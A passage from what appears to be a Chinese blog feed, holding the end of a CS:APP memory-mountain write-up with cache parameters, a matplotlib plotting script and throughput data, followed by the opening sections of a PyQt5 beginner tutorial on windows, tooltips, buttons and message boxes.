<li><a href="http://csapp.cs.cmu.edu/3e/students.html">CS:APP3e, Bryant and O’Hallaron (cmu.edu)</a></li>
</ul>
<span id="more"></span>

<h2 id="一、列出cache参数"><a href="#一、列出cache参数" class="headerlink" title="一、列出cache参数"></a>一、列出cache参数</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">lscpu</span></span><br><span class="line">...</span><br><span class="line">L1d cache:                       192 KiB</span><br><span class="line">L1i cache:                       192 KiB</span><br><span class="line">L2 cache:                        1.5 MiB</span><br><span class="line">L3 cache:                        9 MiB</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>本机共6个cpu（cpu0-5)。每个cpu目录下，都有它能够使用的cache的信息：</p>
<p><img src="/../pic/memory-mountain/cpu0-cache-ls.png" alt="cpu0-cache-ls"></p>
<p><img src="/../pic/memory-mountain/cpu0-index0-ls.png" alt="cpu0-index0-ls"></p>
<p>下面以cpu0和cpu1为例，列出它们各自cache的信息。</p>
<p>cpu0可以使用的四个缓存的各项参数如下表所示：</p>
<table>
<thead>
<tr>
<th></th>
<th>index0</th>
<th>index1</th>
<th>index2</th>
<th>index3</th>
</tr>
</thead>
<tbody><tr>
<td>id</td>
<td>0</td>
<td>0</td>
<td>0</td>
<td>0</td>
</tr>
<tr>
<td>level</td>
<td>1</td>
<td>1</td>
<td>2</td>
<td>3</td>
</tr>
<tr>
<td>type</td>
<td>Data</td>
<td>Instruction</td>
<td>Unified</td>
<td>Unified</td>
</tr>
<tr>
<td>size</td>
<td>32K</td>
<td>32K</td>
<td>256K</td>
<td>9216K</td>
</tr>
<tr>
<td>coherency_line_size</td>
<td>64</td>
<td>64</td>
<td>64</td>
<td>64</td>
</tr>
<tr>
<td>number_of_sets</td>
<td>64</td>
<td>64</td>
<td>1024</td>
<td>12288</td>
</tr>
<tr>
<td>physical_line_partition</td>
<td>1</td>
<td>1</td>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>shared_cpu_list</td>
<td>0</td>
<td>0</td>
<td>0</td>
<td>0-5</td>
</tr>
<tr>
<td>shared_cpu_map</td>
<td>01</td>
<td>01</td>
<td>01</td>
<td>3f</td>
</tr>
<tr>
<td>ways_of_associativity</td>
<td>8</td>
<td>8</td>
<td>4</td>
<td>12</td>
</tr>
</tbody></table>
<p>cpu1可以使用的四个缓存的各项参数如下表所示：</p>
<table>
<thead>
<tr>
<th></th>
<th>index0</th>
<th>index1</th>
<th>index2</th>
<th>index3</th>
</tr>
</thead>
<tbody><tr>
<td>id</td>
<td>1</td>
<td>1</td>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>level</td>
<td>1</td>
<td>1</td>
<td>2</td>
<td>3</td>
</tr>
<tr>
<td>type</td>
<td>Data</td>
<td>Instruction</td>
<td>Unified</td>
<td>Unified</td>
</tr>
<tr>
<td>size</td>
<td>32K</td>
<td>32K</td>
<td>256K</td>
<td>9216K</td>
</tr>
<tr>
<td>coherency_line_size</td>
<td>64</td>
<td>64</td>
<td>64</td>
<td>64</td>
</tr>
<tr>
<td>number_of_sets</td>
<td>64</td>
<td>64</td>
<td>1024</td>
<td>12288</td>
</tr>
<tr>
<td>physical_line_partition</td>
<td>1</td>
<td>1</td>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>shared_cpu_list</td>
<td>1</td>
<td>1</td>
<td>1</td>
<td>0-5</td>
</tr>
<tr>
<td>shared_cpu_map</td>
<td>02</td>
<td>02</td>
<td>02</td>
<td>3f</td>
</tr>
<tr>
<td>ways_of_associativity</td>
<td>8</td>
<td>8</td>
<td>4</td>
<td>12</td>
</tr>
</tbody></table>
<h3 id="二、绘制存储器山"><a href="#二、绘制存储器山" class="headerlink" title="二、绘制存储器山"></a>二、绘制存储器山</h3><p><img src="/../pic/memory-mountain/memory-mountain-2.png" alt="memory-mountain-2"></p>
<p><img src="/../pic/memory-mountain/memory-mountain-3.png" alt="memory-mountain-3"></p>
<p>首先运行mountain程序，并将输出结果重定向到<code>mountain.txt</code>中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./mountain &gt; mountain.txt</span><br></pre></td></tr></table></figure>

<p>使用python读取输出结果并绘制图像，代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> mpl_toolkits.mplot3d <span class="keyword">import</span> Axes3D</span><br><span class="line"></span><br><span class="line">plt.rcParams[<span class="string">&#x27;font.family&#x27;</span>] = <span class="string">&#x27;SimHei&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_from_file</span>(<span class="params">path</span>):</span><br><span class="line">    z = []</span><br><span class="line">    y_ticklabels = []</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./mountain.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        lines = f.readlines()</span><br><span class="line">        x_ticklabels = lines[<span class="number">2</span>].strip().split(<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> lines[<span class="number">3</span>:]:</span><br><span class="line">            line = line.strip().split(<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(line) != <span class="number">0</span>:</span><br><span class="line">                y_ticklabels.append(line[<span class="number">0</span>])</span><br><span class="line">            z.append([<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> line[<span class="number">1</span>:]])</span><br><span class="line">    <span class="keyword">return</span> np.array(z) , np.array(x_ticklabels), np.array(y_ticklabels)</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个3D图形对象</span></span><br><span class="line">fig = plt.figure()</span><br><span class="line">ax1 = fig.add_subplot(<span class="number">121</span>, projection=<span class="string">&#x27;3d&#x27;</span>)</span><br><span class="line">ax2 = fig.add_subplot(<span class="number">122</span>, projection=<span class="string">&#x27;3d&#x27;</span>)</span><br><span class="line"><span class="comment"># 创建网格数据</span></span><br><span class="line">x = np.arange(<span class="number">15</span>)</span><br><span class="line">y = np.arange(<span class="number">14</span>)</span><br><span class="line">x, y = np.meshgrid(x, y)</span><br><span class="line">z, x_ticklabels , y_ticklabels = read_from_file(<span class="string">&quot;./mountain.txt&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制3D曲面图，应用颜色映射</span></span><br><span class="line">colormap = plt.get_cmap(<span class="string">&#x27;plasma&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> ax <span class="keyword">in</span> [ax1, ax2]:</span><br><span class="line">    surf = ax.plot_surface(x, y, z, cmap=colormap)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 设置轴标签</span></span><br><span class="line">    ax.set_xlabel(<span class="string">&#x27;步长\n(x8 bytes)&#x27;</span>)</span><br><span class="line">    ax.set_ylabel(<span class="string">&#x27;大小(bytes)&#x27;</span>)</span><br><span class="line">    ax.set_zlabel(<span class="string">&#x27;读吞吐量(MB/s)&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    ax.set_xticks(<span class="built_in">range</span>(<span class="built_in">len</span>(x_ticklabels)))</span><br><span class="line">    ax.set_yticks(<span class="built_in">range</span>(<span class="built_in">len</span>(y_ticklabels)))</span><br><span class="line">    ax.set_xticklabels(x_ticklabels)</span><br><span class="line">    ax.set_yticklabels(y_ticklabels)</span><br><span class="line"></span><br><span class="line">ax2.view_init(azim=<span class="number">0</span>)</span><br><span class="line"><span class="comment"># ax1.view_init(azim=-90)</span></span><br><span class="line"><span class="comment"># ax2.view_init(elev=90, azim=0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示图形</span></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<h2 id="三、测试数据列表"><a href="#三、测试数据列表" class="headerlink" title="三、测试数据列表"></a>三、测试数据列表</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Clock frequency is approx. 2904.0 MHz</span><br><span class="line">Memory mountain (MB/sec)</span><br><span class="line">		s1		s2		s3		s4		s5		s6		s7		s8		s9		s10		s11		s12		s13		s14		s15	</span><br><span class="line">128m	17796	10321	7056	5149	4091	3472	2947	2579	2311	2107	1961	1816	1702	1622	1605	</span><br><span class="line">64m		18269	10471	7119	5137	4180	3492	2965	2617	2360	2161	2010	1874	1790	1659	1619	</span><br><span class="line">32m		18473	10803	7407	5383	4282	3653	3123	2727	2522	2320	2173	2033	1935	1833	1785	</span><br><span class="line">16m		18664	11309	8015	6391	5028	4348	3887	3384	3162	3049	2730	2719	2361	2619	2514	</span><br><span class="line">8m		23334	15252	11627	9366	7769	6600	5734	5283	5387	5436	5431	5417	4865	5070	5181	</span><br><span class="line">4m		32108	23975	19482	15685	13245	11416	10047	8906	8554	8300	8006	7752	7572	7403	7259	</span><br><span class="line">2m		32679	24999	20430	16263	13521	11481	10155	8957	8719	8396	8087	7803	7609	7422	7298	</span><br><span class="line">1024k	32602	24671	20300	16291	13646	11716	10301	9007	8708	8384	8090	7798	7574	7428	7316	</span><br><span class="line">512k	32584	24859	20540	16541	13854	11878	10483	9223	8959	8679	8442	8333	8237	8158	8240	</span><br><span class="line">256k	34448	28029	25647	22996	20533	18201	16064	14173	14305	14053	14115	14685	13959	14389	14288	</span><br><span class="line">128k	34831	28976	26846	23784	20530	17720	15774	13799	13400	13327	13176	12946	12802	12891	12650	</span><br><span class="line">64k		35434	30363	29479	26820	22311	19961	17284	14595	15157	14925	14525	14766	13929	16971	28321	</span><br><span class="line">32k		39849	37582	37625	37701	37023	36207	36250	35507	34772	36590	38266	36201	34197	31754	35832	</span><br><span class="line">16k		38872	37582	36710	36376	34976	38485	32987	36487	33241	34721	35155	33880	35525	29545	33381	</span><br></pre></td></tr></table></figure>

<h2 id="四、存储器山分析"><a href="#四、存储器山分析" class="headerlink" title="四、存储器山分析"></a>四、存储器山分析</h2><p>可以比较清晰的看出，存储器山分成了四层，分别对应三级缓存和主存。</p>
<p>且前两道山脊分别对应着L1和L2单个缓存芯片的大小（32k和256k）：</p>
<p><img src="/../pic/memory-mountain/memory-mountain-2-mark.png" alt="memory-mountain-3"></p>
]]></content>
      <categories>
        <category>else</category>
      </categories>
  </entry>
  <entry>
    <title>PyQt5</title>
    <url>/2023/11/07/Learning-Python/PyQt5/</url>
    <content><![CDATA[<p>PyQt5学习笔记。</p>
<p>参考链接：</p>
<ul>
<li><a href="https://github.com/lxgzhw520/PyQT5-Tutorial">lxgzhw520&#x2F;PyQT5-Tutorial: 理想国PyQT5零基础入门教程 (github.com)</a></li>
</ul>
<span id="more"></span>

<h2 id="快速入门"><a href="#快速入门" class="headerlink" title="快速入门"></a>快速入门</h2><h3 id="基本框架"><a href="#基本框架" class="headerlink" title="基本框架"></a>基本框架</h3><blockquote>
<p>QWidget QApplication</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtWidgets <span class="keyword">import</span> QApplication, QWidget	<span class="comment"># PyQt5.QtWidgets模块包含了各种基本组件</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app = QApplication(sys.argv)	<span class="comment"># 创建一个Qt应用对象，传递命令行参数列表</span></span><br><span class="line">    </span><br><span class="line">    w = QWidget()		<span class="comment"># 注册一个QWidget控件，它是一个用户界面的基本控件。默认情况下控件没有父级，没有父级的组件称为窗口(windows)</span></span><br><span class="line">    w.resize(<span class="number">500</span>, <span class="number">300</span>)	<span class="comment"># 设置控件大小，先宽后高，单位：px</span></span><br><span class="line">    w.move(<span class="number">800</span>, <span class="number">300</span>)	<span class="comment"># 设置控件位置，先横后竖，单位：px，原点在屏幕左上角</span></span><br><span class="line">    w.setWindowTitle(<span class="string">&quot;PyQt5快速入门&quot;</span>)	<span class="comment"># 设置标题栏</span></span><br><span class="line">    w.show()			<span class="comment"># 显示控件，控件现在内存创建，使用.show()方法才显示到桌面</span></span><br><span class="line">    </span><br><span class="line">    sys.exit(app.exec_())	<span class="comment"># 调用app.exec_()进入应用主循环，事件处理器开始工作。</span></span><br><span class="line">    						<span class="comment"># 主循环从窗口上接收事件，并把事件派发到应用控件中。</span></span><br><span class="line">        					<span class="comment"># 当调用exit()方法或直接销毁主控件(点击窗口右上角x号)时，主循环就会结束。</span></span><br><span class="line">            				<span class="comment"># sys.exit()方法能够确保主循环安全退出，外部环境能通知主控件怎么结束(？)</span></span><br><span class="line">                			<span class="comment"># app.exec_()之所以有个下划线，是因为exec是python的一个关键字</span></span><br></pre></td></tr></table></figure>

<p><img src="/../../pic/Learning-Python/pyqt5/1-basic.png" alt="1-basic"></p>
<h3 id="窗口图标"><a href="#窗口图标" class="headerlink" title="窗口图标"></a>窗口图标</h3><blockquote>
<p>QIcon</p>
</blockquote>
<p>窗口图标通常显示在窗口的左上角，标题栏的最左边。</p>
<p>可以在上一节的代码（过程式编程）中添加以下语句：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PyQt5.QtGui <span class="keyword">import</span> QIcon</span><br><span class="line">...</span><br><span class="line">w.setWindowIcon(QIcon(<span class="string">&quot;logo.png&quot;</span>)) <span class="comment"># 也可以是其他格式的图片，如.ico等</span></span><br></pre></td></tr></table></figure>

<p>但使用面向对象的编程方式，新建一个类，是更常用的写法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtWidgets <span class="keyword">import</span> QApplication, QWidget</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtGui <span class="keyword">import</span> QIcon</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">QuickStart</span>(<span class="title class_ inherited__">QWidget</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()	<span class="comment"># super()返回父类构造器的对象</span></span><br><span class="line">        self.initUI()</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">initUI</span>(<span class="params">self</span>):</span><br><span class="line">        self.setGeometry(<span class="number">800</span>, <span class="number">300</span>, <span class="number">500</span>, <span class="number">300</span>)  <span class="comment"># 设计几何体参数，ax,ay,aw,ah，先位置，后大小</span></span><br><span class="line">        self.setWindowTitle(<span class="string">&quot;PyQt5快速入门&quot;</span>)	<span class="comment"># 这几个方法都继承自QWidget</span></span><br><span class="line">        self.setWindowIcon(QIcon(<span class="string">&quot;logo.png&quot;</span>)) <span class="comment"># 先使用QIcon接收一个路径参数，创建一个QIcon对象，然后使用setWindowIcon()设置图标</span></span><br><span class="line">        self.show()</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app = QApplication(sys.argv)	<span class="comment"># 创建应用</span></span><br><span class="line">    qs = QuickStart()				<span class="comment"># 创建窗口对象</span></span><br><span class="line">    sys.exit(app.exec_())			<span class="comment"># 应用主循环开始</span></span><br></pre></td></tr></table></figure>

<p><img src="/../../pic/Learning-Python/pyqt5/2-withIcon.png" alt="2-withIcon"></p>
<h3 id="提示框"><a href="#提示框" class="headerlink" title="提示框"></a>提示框</h3><blockquote>
<p>QToolTip QPushButton</p>
<p>QFont</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtWidgets <span class="keyword">import</span> (QWidget, QToolTip,</span><br><span class="line">                             QPushButton, QApplication)</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtGui <span class="keyword">import</span> QFont, QIcon</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">QuickStart</span>(<span class="title class_ inherited__">QWidget</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.initUI()</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">initUI</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 设置提示框字体</span></span><br><span class="line">        QToolTip.setFont(QFont(<span class="string">&quot;SimHei&quot;</span>, <span class="number">10</span>)) <span class="comment"># 使用中文字体，不然中文会乱码，10px</span></span><br><span class="line">        <span class="comment"># 设置鼠标悬浮提示信息</span></span><br><span class="line">        self.setToolTip(<span class="string">&quot;这是一个&lt;b&gt;QWidget&lt;/b&gt;组件&quot;</span>)	<span class="comment"># 支持富文本格式，标签b-粗体</span></span><br><span class="line">        <span class="comment"># 创建按钮</span></span><br><span class="line">        btn = QPushButton(<span class="string">&quot;按钮&quot;</span>, self) <span class="comment"># 指定父级对象为当前控件</span></span><br><span class="line">        btn.setToolTip(<span class="string">&quot;这是一个&lt;i&gt;QPushButton&lt;/i&gt;组件&quot;</span>) <span class="comment"># 标签i-斜体</span></span><br><span class="line">        <span class="comment"># 设置按钮的大小和位置</span></span><br><span class="line">        btn.resize(btn.sizeHint())	<span class="comment"># sizeHint()方法提供一个默认的按钮大小</span></span><br><span class="line">        btn.move(<span class="number">200</span>, <span class="number">125</span>) <span class="comment"># 以父对象的左上角为原点</span></span><br><span class="line">        <span class="comment"># 设置窗口的位置和大小</span></span><br><span class="line">        self.setGeometry(<span class="number">800</span>, <span class="number">300</span>, <span class="number">500</span>, <span class="number">300</span>)</span><br><span class="line">        <span class="comment"># 设置窗口的标题</span></span><br><span class="line">        self.setWindowTitle(<span class="string">&quot;提示框&quot;</span>)</span><br><span class="line">        <span class="comment"># 设置图标</span></span><br><span class="line">        self.setWindowIcon(QIcon(<span class="string">&quot;logo.png&quot;</span>))</span><br><span class="line">        <span class="comment"># 显示窗口</span></span><br><span class="line">        self.show()</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app = QApplication(sys.argv)	<span class="comment"># 创建应用</span></span><br><span class="line">    qs = QuickStart()				<span class="comment"># 创建窗口对象</span></span><br><span class="line">    sys.exit(app.exec_())			<span class="comment"># 应用主循环开始</span></span><br></pre></td></tr></table></figure>

<p><img src="/../../pic/Learning-Python/pyqt5/3-tooltip.png" alt="3-tooltip"></p>
<h3 id="关闭窗口"><a href="#关闭窗口" class="headerlink" title="关闭窗口"></a>关闭窗口</h3><blockquote>
<p>btn.clicked.connect(func)</p>
</blockquote>
<p>关闭窗口除了点击右上角的❌，也可以通过程序来完成。</p>
<p>涉及到<code>single</code>和<code>slot</code>的知识。感觉可以理解为事件回调函数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtWidgets <span class="keyword">import</span> QWidget, QPushButton, QToolTip, QApplication</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtCore <span class="keyword">import</span> QCoreApplication</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtGui <span class="keyword">import</span> QIcon, QFont</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">QuickStart</span>(<span class="title class_ inherited__">QWidget</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.initUI()</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">initUI</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 创建退出按钮</span></span><br><span class="line">        btn = QPushButton(<span class="string">&quot;退出&quot;</span>, self)</span><br><span class="line">        <span class="comment"># 注册点击事件为退出事件(点击的回调函数为应用退出函数)</span></span><br><span class="line">        btn.clicked.connect(QCoreApplication.instance().quit)</span><br><span class="line">		<span class="comment"># 设置退出按钮提示</span></span><br><span class="line">        QToolTip.setFont(QFont(<span class="string">&quot;simHei&quot;</span>, <span class="number">10</span>))</span><br><span class="line">        btn.setToolTip(<span class="string">&quot;点击退出程序&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        btn.move(<span class="number">50</span>, <span class="number">50</span>)</span><br><span class="line">        btn.resize(btn.sizeHint())</span><br><span class="line"></span><br><span class="line">        self.setGeometry(<span class="number">800</span>, <span class="number">300</span>, <span class="number">500</span>, <span class="number">300</span>)</span><br><span class="line">        self.setWindowTitle(<span class="string">&quot;PyQt5快速入门&quot;</span>)</span><br><span class="line">        self.setWindowIcon(QIcon(<span class="string">&quot;logo.png&quot;</span>))</span><br><span class="line">        self.show()</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app = QApplication(sys.argv)	<span class="comment"># 创建应用</span></span><br><span class="line">    qs = QuickStart()				<span class="comment"># 创建窗口对象</span></span><br><span class="line">    sys.exit(app.exec_())			<span class="comment"># 应用主循环开始</span></span><br></pre></td></tr></table></figure>

<p>也可以自定义回调函数，如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">initUI</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="comment"># 创建退出按钮</span></span><br><span class="line">    btn = QPushButton(<span class="string">&quot;退出&quot;</span>, self)</span><br><span class="line">    <span class="comment"># 注册点击事件为退出事件(点击的回调函数为应用退出函数)</span></span><br><span class="line">    btn.clicked.connect(self.btnClicked)</span><br><span class="line">    <span class="comment"># 设置退出按钮提示</span></span><br><span class="line">    QToolTip.setFont(QFont(<span class="string">&quot;simHei&quot;</span>, <span class="number">10</span>))</span><br><span class="line">    btn.setToolTip(<span class="string">&quot;点击退出程序&quot;</span>)</span><br><span class="line"></span><br><span class="line">    btn.move(<span class="number">50</span>, <span class="number">50</span>)</span><br><span class="line">    btn.resize(btn.sizeHint())</span><br><span class="line"></span><br><span class="line">    self.setGeometry(<span class="number">800</span>, <span class="number">300</span>, <span class="number">500</span>, <span class="number">300</span>)</span><br><span class="line">    self.setWindowTitle(<span class="string">&quot;PyQt5快速入门&quot;</span>)</span><br><span class="line">    self.setWindowIcon(QIcon(<span class="string">&quot;logo.png&quot;</span>))</span><br><span class="line">    self.show()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">btnClicked</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;退出程序&quot;</span>)</span><br><span class="line">    QCoreApplication.instance().quit()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;程序已退出&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="消息盒子"><a href="#消息盒子" class="headerlink" title="消息盒子"></a>消息盒子</h3><blockquote>
<p>QMessageBox</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtWidgets <span class="keyword">import</span> QApplication, QWidget, QPushButton, QToolTip, QMessageBox</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtCore <span class="keyword">import</span> QCoreApplication</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtGui <span class="keyword">import</span> QIcon, QFont</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">QuickStart</span>(<span class="title class_ inherited__">QWidget</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.initUI()</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">initUI</span>(<span class="params">self</span>):</span><br><span class="line">        self.setGeometry(<span class="number">800</span>, <span class="number">300</span>, <span class="number">500</span>, <span class="number">300</span>)</span><br><span class="line">        self.setWindowTitle(<span class="string">&quot;PyQt5快速入门&quot;</span>)</span><br><span class="line">        self.setWindowIcon(QIcon(<span class="string">&quot;logo.png&quot;</span>))</span><br><span class="line">        self.show()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 关闭窗口时，会给窗口传递一个QCloseEvent事件，调用窗口的closeEvent函数</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">closeEvent</span>(<span class="params">self, event</span>): 	<span class="comment"># 这里重写父类的closeEvent函数，替换默认的事件处理函数，也就改变了默认行为</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;退出事件&quot;&quot;&quot;</span></span><br><span class="line">        reply = QMessageBox.question(self, <span class="string">&quot;消息&quot;</span>, <span class="string">&quot;您确定要退出吗？&quot;</span>, </span><br><span class="line">                                    QMessageBox.Yes | QMessageBox.No, QMessageBox.No)</span><br><span class="line">        <span class="keyword">if</span> reply == QMessageBox.Yes:</span><br><span class="line">            event.accept()	<span class="comment"># 接收事件，继续传递，执行后续关闭操作</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            event.ignore()	<span class="comment"># 忽略，不再往下传递此次关闭事件</span></span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app = QApplication(sys.argv)	<span class="comment"># 创建应用</span></span><br><span class="line">    qs = QuickStart()				<span class="comment"># 创建窗口对象</span></span><br><span class="line">    sys.exit(app.exec_())			<span class="comment"># 应用主循环开始</span></span><br></pre></td></tr></table></figure>

<h3 id="窗口居中"><a href="#窗口居中" class="headerlink" title="窗口居中"></a>窗口居中</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtWidgets <span class="keyword">import</span> QApplication, QWidget, QPushButton, QMessageBox, QDesktopWidget</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtCore <span class="keyword">import</span> QCoreApplication</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtGui <span class="keyword">import</span> QIcon, QFont</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">QuickStart</span>(<span class="title class_ inherited__">QWidget</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.initUI()</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">initUI</span>(<span class="params">self</span>):</span><br><span class="line">        self.setGeometry(<span class="number">800</span>, <span class="number">300</span>, <span class="number">500</span>, <span class="number">300</span>)</span><br><span class="line">        self.setWindowTitle(<span class="string">&quot;PyQt5快速入门&quot;</span>)</span><br><span class="line">        self.setWindowIcon(QIcon(<span class="string">&quot;logo.png&quot;</span>))</span><br><span class="line">        self.center()</span><br><span class="line"></span><br><span class="line">        btn = QPushButton(<span class="string">&quot;直接退出&quot;</span>, self)</span><br><span class="line">        btn.resize(btn.sizeHint())</span><br><span class="line">        btn.move(<span class="number">200</span>, <span class="number">100</span>)</span><br><span class="line">        btn.clicked.connect(QCoreApplication.instance().quit)</span><br><span class="line">        </span><br><span class="line">        self.show()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">closeEvent</span>(<span class="params">self, event</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;退出事件&quot;&quot;&quot;</span></span><br><span class="line">        reply = QMessageBox.question(self, <span class="string">&quot;消息&quot;</span>, <span class="string">&quot;您确定要退出吗？&quot;</span>, </span><br><span class="line">                                    QMessageBox.Yes | QMessageBox.No, QMessageBox.No)</span><br><span class="line">        <span class="keyword">if</span> reply == QMessageBox.Yes:</span><br><span class="line">            event.accept()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            event.ignore()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">center</span>(<span class="params">self</span>):</span><br><span class="line">        window_frame = self.frameGeometry()	<span class="comment"># 获得主窗口所在框架</span></span><br><span class="line">        desktop_center = QDesktopWidget().availableGeometry().center()	<span class="comment"># 获取显示器框架，并得到屏幕中心点的位置</span></span><br><span class="line">        window_frame.moveCenter(desktop_center)	<span class="comment"># 将主窗口框架的中心，移到屏幕中心</span></span><br><span class="line">        self.move(window_frame.topLeft())	<span class="comment"># 然后，通过move函数，把主窗口的左上角，移到主窗口框架的左上角哎，完成居中</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app = QApplication(sys.argv)	<span class="comment"># 创建应用</span></span><br><span class="line">    qs = QuickStart()				<span class="comment"># 创建窗口对象</span></span><br><span class="line">    sys.exit(app.exec_())			<span class="comment"># 应用主循环开始</span></span><br></pre></td></tr></table></figure>

<h3 id="状态栏"><a href="#状态栏" class="headerlink" title="状态栏"></a>状态栏</h3><p>QWidget本身是没有状态栏和菜单栏的，但QMainWindow（继承自QWidget）提供了常用的主窗口功能，能够用来创建一些状态栏、工具栏和菜单栏。</p>
<p>状态栏用于显示应用的状态信息。</p>
